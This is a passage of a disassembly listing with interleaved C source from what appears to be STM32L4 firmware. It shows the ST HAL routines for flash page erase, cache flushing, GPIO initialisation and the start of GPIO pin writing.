void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 8001840:	b480      	push	{r7}
 8001842:	b083      	sub	sp, #12
 8001844:	af00      	add	r7, sp, #0
 8001846:	6078      	str	r0, [r7, #4]
 8001848:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 800184a:	4b0e      	ldr	r3, [pc, #56]	; (8001884 <FLASH_PageErase+0x44>)
 800184c:	695b      	ldr	r3, [r3, #20]
 800184e:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 8001852:	687b      	ldr	r3, [r7, #4]
 8001854:	00db      	lsls	r3, r3, #3
 8001856:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 800185a:	490a      	ldr	r1, [pc, #40]	; (8001884 <FLASH_PageErase+0x44>)
 800185c:	4313      	orrs	r3, r2
 800185e:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 8001860:	4b08      	ldr	r3, [pc, #32]	; (8001884 <FLASH_PageErase+0x44>)
 8001862:	695b      	ldr	r3, [r3, #20]
 8001864:	4a07      	ldr	r2, [pc, #28]	; (8001884 <FLASH_PageErase+0x44>)
 8001866:	f043 0302 	orr.w	r3, r3, #2
 800186a:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 800186c:	4b05      	ldr	r3, [pc, #20]	; (8001884 <FLASH_PageErase+0x44>)
 800186e:	695b      	ldr	r3, [r3, #20]
 8001870:	4a04      	ldr	r2, [pc, #16]	; (8001884 <FLASH_PageErase+0x44>)
 8001872:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8001876:	6153      	str	r3, [r2, #20]
}
 8001878:	bf00      	nop
 800187a:	370c      	adds	r7, #12
 800187c:	46bd      	mov	sp, r7
 800187e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001882:	4770      	bx	lr
 8001884:	40022000 	.word	0x40022000

08001888 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 8001888:	b480      	push	{r7}
 800188a:	b083      	sub	sp, #12
 800188c:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 800188e:	4b21      	ldr	r3, [pc, #132]	; (8001914 <FLASH_FlushCaches+0x8c>)
 8001890:	7f1b      	ldrb	r3, [r3, #28]
 8001892:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001894:	79fb      	ldrb	r3, [r7, #7]
 8001896:	2b01      	cmp	r3, #1
 8001898:	d002      	beq.n	80018a0 <FLASH_FlushCaches+0x18>
 800189a:	79fb      	ldrb	r3, [r7, #7]
 800189c:	2b03      	cmp	r3, #3
 800189e:	d117      	bne.n	80018d0 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 80018a0:	4b1d      	ldr	r3, [pc, #116]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018a2:	681b      	ldr	r3, [r3, #0]
 80018a4:	4a1c      	ldr	r2, [pc, #112]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018a6:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 80018aa:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 80018ac:	4b1a      	ldr	r3, [pc, #104]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018ae:	681b      	ldr	r3, [r3, #0]
 80018b0:	4a19      	ldr	r2, [pc, #100]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018b2:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 80018b6:	6013      	str	r3, [r2, #0]
 80018b8:	4b17      	ldr	r3, [pc, #92]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018ba:	681b      	ldr	r3, [r3, #0]
 80018bc:	4a16      	ldr	r2, [pc, #88]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018be:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 80018c2:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 80018c4:	4b14      	ldr	r3, [pc, #80]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018c6:	681b      	ldr	r3, [r3, #0]
 80018c8:	4a13      	ldr	r2, [pc, #76]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018ca:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80018ce:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 80018d0:	79fb      	ldrb	r3, [r7, #7]
 80018d2:	2b02      	cmp	r3, #2
 80018d4:	d002      	beq.n	80018dc <FLASH_FlushCaches+0x54>
 80018d6:	79fb      	ldrb	r3, [r7, #7]
 80018d8:	2b03      	cmp	r3, #3
 80018da:	d111      	bne.n	8001900 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 80018dc:	4b0e      	ldr	r3, [pc, #56]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018de:	681b      	ldr	r3, [r3, #0]
 80018e0:	4a0d      	ldr	r2, [pc, #52]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018e2:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 80018e6:	6013      	str	r3, [r2, #0]
 80018e8:	4b0b      	ldr	r3, [pc, #44]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018ea:	681b      	ldr	r3, [r3, #0]
 80018ec:	4a0a      	ldr	r2, [pc, #40]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018ee:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 80018f2:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 80018f4:	4b08      	ldr	r3, [pc, #32]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018f6:	681b      	ldr	r3, [r3, #0]
 80018f8:	4a07      	ldr	r2, [pc, #28]	; (8001918 <FLASH_FlushCaches+0x90>)
 80018fa:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80018fe:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001900:	4b04      	ldr	r3, [pc, #16]	; (8001914 <FLASH_FlushCaches+0x8c>)
 8001902:	2200      	movs	r2, #0
 8001904:	771a      	strb	r2, [r3, #28]
}
 8001906:	bf00      	nop
 8001908:	370c      	adds	r7, #12
 800190a:	46bd      	mov	sp, r7
 800190c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001910:	4770      	bx	lr
 8001912:	bf00      	nop
 8001914:	2000000c 	.word	0x2000000c
 8001918:	40022000 	.word	0x40022000

0800191c <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 800191c:	b480      	push	{r7}
 800191e:	b087      	sub	sp, #28
 8001920:	af00      	add	r7, sp, #0
 8001922:	6078      	str	r0, [r7, #4]
 8001924:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001926:	2300      	movs	r3, #0
 8001928:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 800192a:	e148      	b.n	8001bbe <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 800192c:	683b      	ldr	r3, [r7, #0]
 800192e:	681a      	ldr	r2, [r3, #0]
 8001930:	2101      	movs	r1, #1
 8001932:	697b      	ldr	r3, [r7, #20]
 8001934:	fa01 f303 	lsl.w	r3, r1, r3
 8001938:	4013      	ands	r3, r2
 800193a:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 800193c:	68fb      	ldr	r3, [r7, #12]
 800193e:	2b00      	cmp	r3, #0
 8001940:	f000 813a 	beq.w	8001bb8 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001944:	683b      	ldr	r3, [r7, #0]
 8001946:	685b      	ldr	r3, [r3, #4]
 8001948:	f003 0303 	and.w	r3, r3, #3
 800194c:	2b01      	cmp	r3, #1
 800194e:	d005      	beq.n	800195c <HAL_GPIO_Init+0x40>
 8001950:	683b      	ldr	r3, [r7, #0]
 8001952:	685b      	ldr	r3, [r3, #4]
 8001954:	f003 0303 	and.w	r3, r3, #3
 8001958:	2b02      	cmp	r3, #2
 800195a:	d130      	bne.n	80019be <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 800195c:	687b      	ldr	r3, [r7, #4]
 800195e:	689b      	ldr	r3, [r3, #8]
 8001960:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001962:	697b      	ldr	r3, [r7, #20]
 8001964:	005b      	lsls	r3, r3, #1
 8001966:	2203      	movs	r2, #3
 8001968:	fa02 f303 	lsl.w	r3, r2, r3
 800196c:	43db      	mvns	r3, r3
 800196e:	693a      	ldr	r2, [r7, #16]
 8001970:	4013      	ands	r3, r2
 8001972:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001974:	683b      	ldr	r3, [r7, #0]
 8001976:	68da      	ldr	r2, [r3, #12]
 8001978:	697b      	ldr	r3, [r7, #20]
 800197a:	005b      	lsls	r3, r3, #1
 800197c:	fa02 f303 	lsl.w	r3, r2, r3
 8001980:	693a      	ldr	r2, [r7, #16]
 8001982:	4313      	orrs	r3, r2
 8001984:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 8001986:	687b      	ldr	r3, [r7, #4]
 8001988:	693a      	ldr	r2, [r7, #16]
 800198a:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 800198c:	687b      	ldr	r3, [r7, #4]
 800198e:	685b      	ldr	r3, [r3, #4]
 8001990:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001992:	2201      	movs	r2, #1
 8001994:	697b      	ldr	r3, [r7, #20]
 8001996:	fa02 f303 	lsl.w	r3, r2, r3
 800199a:	43db      	mvns	r3, r3
 800199c:	693a      	ldr	r2, [r7, #16]
 800199e:	4013      	ands	r3, r2
 80019a0:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 80019a2:	683b      	ldr	r3, [r7, #0]
 80019a4:	685b      	ldr	r3, [r3, #4]
 80019a6:	091b      	lsrs	r3, r3, #4
 80019a8:	f003 0201 	and.w	r2, r3, #1
 80019ac:	697b      	ldr	r3, [r7, #20]
 80019ae:	fa02 f303 	lsl.w	r3, r2, r3
 80019b2:	693a      	ldr	r2, [r7, #16]
 80019b4:	4313      	orrs	r3, r2
 80019b6:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 80019b8:	687b      	ldr	r3, [r7, #4]
 80019ba:	693a      	ldr	r2, [r7, #16]
 80019bc:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 80019be:	683b      	ldr	r3, [r7, #0]
 80019c0:	685b      	ldr	r3, [r3, #4]
 80019c2:	f003 0303 	and.w	r3, r3, #3
 80019c6:	2b03      	cmp	r3, #3
 80019c8:	d017      	beq.n	80019fa <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 80019ca:	687b      	ldr	r3, [r7, #4]
 80019cc:	68db      	ldr	r3, [r3, #12]
 80019ce:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 80019d0:	697b      	ldr	r3, [r7, #20]
 80019d2:	005b      	lsls	r3, r3, #1
 80019d4:	2203      	movs	r2, #3
 80019d6:	fa02 f303 	lsl.w	r3, r2, r3
 80019da:	43db      	mvns	r3, r3
 80019dc:	693a      	ldr	r2, [r7, #16]
 80019de:	4013      	ands	r3, r2
 80019e0:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 80019e2:	683b      	ldr	r3, [r7, #0]
 80019e4:	689a      	ldr	r2, [r3, #8]
 80019e6:	697b      	ldr	r3, [r7, #20]
 80019e8:	005b      	lsls	r3, r3, #1
 80019ea:	fa02 f303 	lsl.w	r3, r2, r3
 80019ee:	693a      	ldr	r2, [r7, #16]
 80019f0:	4313      	orrs	r3, r2
 80019f2:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 80019f4:	687b      	ldr	r3, [r7, #4]
 80019f6:	693a      	ldr	r2, [r7, #16]
 80019f8:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 80019fa:	683b      	ldr	r3, [r7, #0]
 80019fc:	685b      	ldr	r3, [r3, #4]
 80019fe:	f003 0303 	and.w	r3, r3, #3
 8001a02:	2b02      	cmp	r3, #2
 8001a04:	d123      	bne.n	8001a4e <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001a06:	697b      	ldr	r3, [r7, #20]
 8001a08:	08da      	lsrs	r2, r3, #3
 8001a0a:	687b      	ldr	r3, [r7, #4]
 8001a0c:	3208      	adds	r2, #8
 8001a0e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001a12:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001a14:	697b      	ldr	r3, [r7, #20]
 8001a16:	f003 0307 	and.w	r3, r3, #7
 8001a1a:	009b      	lsls	r3, r3, #2
 8001a1c:	220f      	movs	r2, #15
 8001a1e:	fa02 f303 	lsl.w	r3, r2, r3
 8001a22:	43db      	mvns	r3, r3
 8001a24:	693a      	ldr	r2, [r7, #16]
 8001a26:	4013      	ands	r3, r2
 8001a28:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001a2a:	683b      	ldr	r3, [r7, #0]
 8001a2c:	691a      	ldr	r2, [r3, #16]
 8001a2e:	697b      	ldr	r3, [r7, #20]
 8001a30:	f003 0307 	and.w	r3, r3, #7
 8001a34:	009b      	lsls	r3, r3, #2
 8001a36:	fa02 f303 	lsl.w	r3, r2, r3
 8001a3a:	693a      	ldr	r2, [r7, #16]
 8001a3c:	4313      	orrs	r3, r2
 8001a3e:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001a40:	697b      	ldr	r3, [r7, #20]
 8001a42:	08da      	lsrs	r2, r3, #3
 8001a44:	687b      	ldr	r3, [r7, #4]
 8001a46:	3208      	adds	r2, #8
 8001a48:	6939      	ldr	r1, [r7, #16]
 8001a4a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001a4e:	687b      	ldr	r3, [r7, #4]
 8001a50:	681b      	ldr	r3, [r3, #0]
 8001a52:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001a54:	697b      	ldr	r3, [r7, #20]
 8001a56:	005b      	lsls	r3, r3, #1
 8001a58:	2203      	movs	r2, #3
 8001a5a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a5e:	43db      	mvns	r3, r3
 8001a60:	693a      	ldr	r2, [r7, #16]
 8001a62:	4013      	ands	r3, r2
 8001a64:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001a66:	683b      	ldr	r3, [r7, #0]
 8001a68:	685b      	ldr	r3, [r3, #4]
 8001a6a:	f003 0203 	and.w	r2, r3, #3
 8001a6e:	697b      	ldr	r3, [r7, #20]
 8001a70:	005b      	lsls	r3, r3, #1
 8001a72:	fa02 f303 	lsl.w	r3, r2, r3
 8001a76:	693a      	ldr	r2, [r7, #16]
 8001a78:	4313      	orrs	r3, r2
 8001a7a:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001a7c:	687b      	ldr	r3, [r7, #4]
 8001a7e:	693a      	ldr	r2, [r7, #16]
 8001a80:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001a82:	683b      	ldr	r3, [r7, #0]
 8001a84:	685b      	ldr	r3, [r3, #4]
 8001a86:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001a8a:	2b00      	cmp	r3, #0
 8001a8c:	f000 8094 	beq.w	8001bb8 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001a90:	4b52      	ldr	r3, [pc, #328]	; (8001bdc <HAL_GPIO_Init+0x2c0>)
 8001a92:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a94:	4a51      	ldr	r2, [pc, #324]	; (8001bdc <HAL_GPIO_Init+0x2c0>)
 8001a96:	f043 0301 	orr.w	r3, r3, #1
 8001a9a:	6613      	str	r3, [r2, #96]	; 0x60
 8001a9c:	4b4f      	ldr	r3, [pc, #316]	; (8001bdc <HAL_GPIO_Init+0x2c0>)
 8001a9e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001aa0:	f003 0301 	and.w	r3, r3, #1
 8001aa4:	60bb      	str	r3, [r7, #8]
 8001aa6:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001aa8:	4a4d      	ldr	r2, [pc, #308]	; (8001be0 <HAL_GPIO_Init+0x2c4>)
 8001aaa:	697b      	ldr	r3, [r7, #20]
 8001aac:	089b      	lsrs	r3, r3, #2
 8001aae:	3302      	adds	r3, #2
 8001ab0:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001ab4:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001ab6:	697b      	ldr	r3, [r7, #20]
 8001ab8:	f003 0303 	and.w	r3, r3, #3
 8001abc:	009b      	lsls	r3, r3, #2
 8001abe:	220f      	movs	r2, #15
 8001ac0:	fa02 f303 	lsl.w	r3, r2, r3
 8001ac4:	43db      	mvns	r3, r3
 8001ac6:	693a      	ldr	r2, [r7, #16]
 8001ac8:	4013      	ands	r3, r2
 8001aca:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001acc:	687b      	ldr	r3, [r7, #4]
 8001ace:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001ad2:	d00d      	beq.n	8001af0 <HAL_GPIO_Init+0x1d4>
 8001ad4:	687b      	ldr	r3, [r7, #4]
 8001ad6:	4a43      	ldr	r2, [pc, #268]	; (8001be4 <HAL_GPIO_Init+0x2c8>)
 8001ad8:	4293      	cmp	r3, r2
 8001ada:	d007      	beq.n	8001aec <HAL_GPIO_Init+0x1d0>
 8001adc:	687b      	ldr	r3, [r7, #4]
 8001ade:	4a42      	ldr	r2, [pc, #264]	; (8001be8 <HAL_GPIO_Init+0x2cc>)
 8001ae0:	4293      	cmp	r3, r2
 8001ae2:	d101      	bne.n	8001ae8 <HAL_GPIO_Init+0x1cc>
 8001ae4:	2302      	movs	r3, #2
 8001ae6:	e004      	b.n	8001af2 <HAL_GPIO_Init+0x1d6>
 8001ae8:	2307      	movs	r3, #7
 8001aea:	e002      	b.n	8001af2 <HAL_GPIO_Init+0x1d6>
 8001aec:	2301      	movs	r3, #1
 8001aee:	e000      	b.n	8001af2 <HAL_GPIO_Init+0x1d6>
 8001af0:	2300      	movs	r3, #0
 8001af2:	697a      	ldr	r2, [r7, #20]
 8001af4:	f002 0203 	and.w	r2, r2, #3
 8001af8:	0092      	lsls	r2, r2, #2
 8001afa:	4093      	lsls	r3, r2
 8001afc:	693a      	ldr	r2, [r7, #16]
 8001afe:	4313      	orrs	r3, r2
 8001b00:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001b02:	4937      	ldr	r1, [pc, #220]	; (8001be0 <HAL_GPIO_Init+0x2c4>)
 8001b04:	697b      	ldr	r3, [r7, #20]
 8001b06:	089b      	lsrs	r3, r3, #2
 8001b08:	3302      	adds	r3, #2
 8001b0a:	693a      	ldr	r2, [r7, #16]
 8001b0c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001b10:	4b36      	ldr	r3, [pc, #216]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b12:	689b      	ldr	r3, [r3, #8]
 8001b14:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b16:	68fb      	ldr	r3, [r7, #12]
 8001b18:	43db      	mvns	r3, r3
 8001b1a:	693a      	ldr	r2, [r7, #16]
 8001b1c:	4013      	ands	r3, r2
 8001b1e:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001b20:	683b      	ldr	r3, [r7, #0]
 8001b22:	685b      	ldr	r3, [r3, #4]
 8001b24:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001b28:	2b00      	cmp	r3, #0
 8001b2a:	d003      	beq.n	8001b34 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b2c:	693a      	ldr	r2, [r7, #16]
 8001b2e:	68fb      	ldr	r3, [r7, #12]
 8001b30:	4313      	orrs	r3, r2
 8001b32:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b34:	4a2d      	ldr	r2, [pc, #180]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b36:	693b      	ldr	r3, [r7, #16]
 8001b38:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b3a:	4b2c      	ldr	r3, [pc, #176]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b3c:	68db      	ldr	r3, [r3, #12]
 8001b3e:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b40:	68fb      	ldr	r3, [r7, #12]
 8001b42:	43db      	mvns	r3, r3
 8001b44:	693a      	ldr	r2, [r7, #16]
 8001b46:	4013      	ands	r3, r2
 8001b48:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001b4a:	683b      	ldr	r3, [r7, #0]
 8001b4c:	685b      	ldr	r3, [r3, #4]
 8001b4e:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001b52:	2b00      	cmp	r3, #0
 8001b54:	d003      	beq.n	8001b5e <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001b56:	693a      	ldr	r2, [r7, #16]
 8001b58:	68fb      	ldr	r3, [r7, #12]
 8001b5a:	4313      	orrs	r3, r2
 8001b5c:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001b5e:	4a23      	ldr	r2, [pc, #140]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b60:	693b      	ldr	r3, [r7, #16]
 8001b62:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001b64:	4b21      	ldr	r3, [pc, #132]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b66:	685b      	ldr	r3, [r3, #4]
 8001b68:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b6a:	68fb      	ldr	r3, [r7, #12]
 8001b6c:	43db      	mvns	r3, r3
 8001b6e:	693a      	ldr	r2, [r7, #16]
 8001b70:	4013      	ands	r3, r2
 8001b72:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001b74:	683b      	ldr	r3, [r7, #0]
 8001b76:	685b      	ldr	r3, [r3, #4]
 8001b78:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001b7c:	2b00      	cmp	r3, #0
 8001b7e:	d003      	beq.n	8001b88 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001b80:	693a      	ldr	r2, [r7, #16]
 8001b82:	68fb      	ldr	r3, [r7, #12]
 8001b84:	4313      	orrs	r3, r2
 8001b86:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001b88:	4a18      	ldr	r2, [pc, #96]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b8a:	693b      	ldr	r3, [r7, #16]
 8001b8c:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001b8e:	4b17      	ldr	r3, [pc, #92]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001b90:	681b      	ldr	r3, [r3, #0]
 8001b92:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b94:	68fb      	ldr	r3, [r7, #12]
 8001b96:	43db      	mvns	r3, r3
 8001b98:	693a      	ldr	r2, [r7, #16]
 8001b9a:	4013      	ands	r3, r2
 8001b9c:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001b9e:	683b      	ldr	r3, [r7, #0]
 8001ba0:	685b      	ldr	r3, [r3, #4]
 8001ba2:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001ba6:	2b00      	cmp	r3, #0
 8001ba8:	d003      	beq.n	8001bb2 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001baa:	693a      	ldr	r2, [r7, #16]
 8001bac:	68fb      	ldr	r3, [r7, #12]
 8001bae:	4313      	orrs	r3, r2
 8001bb0:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001bb2:	4a0e      	ldr	r2, [pc, #56]	; (8001bec <HAL_GPIO_Init+0x2d0>)
 8001bb4:	693b      	ldr	r3, [r7, #16]
 8001bb6:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001bb8:	697b      	ldr	r3, [r7, #20]
 8001bba:	3301      	adds	r3, #1
 8001bbc:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001bbe:	683b      	ldr	r3, [r7, #0]
 8001bc0:	681a      	ldr	r2, [r3, #0]
 8001bc2:	697b      	ldr	r3, [r7, #20]
 8001bc4:	fa22 f303 	lsr.w	r3, r2, r3
 8001bc8:	2b00      	cmp	r3, #0
 8001bca:	f47f aeaf 	bne.w	800192c <HAL_GPIO_Init+0x10>
  }
}
 8001bce:	bf00      	nop
 8001bd0:	bf00      	nop
 8001bd2:	371c      	adds	r7, #28
 8001bd4:	46bd      	mov	sp, r7
 8001bd6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bda:	4770      	bx	lr
 8001bdc:	40021000 	.word	0x40021000
 8001be0:	40010000 	.word	0x40010000
 8001be4:	48000400 	.word	0x48000400
 8001be8:	48000800 	.word	0x48000800
 8001bec:	40010400 	.word	0x40010400

08001bf0 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001bf0:	b480      	push	{r7}
 8001bf2:	b083      	sub	sp, #12
 8001bf4:	af00      	add	r7, sp, #0
 8001bf6:	6078      	str	r0, [r7, #4]
 8001bf8:	460b      	mov	r3, r1
 8001bfa:	807b      	strh	r3, [r7, #2]
 8001bfc:	4613      	mov	r3, r2
 8001bfe:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001c00:	787b      	ldrb	r3, [r7, #1]
 8001c02:	2b00      	cmp	r3, #0
 8001c04:	d003      	beq.n	8001c0e <HAL_GPIO_WritePin+0x1e>
  {
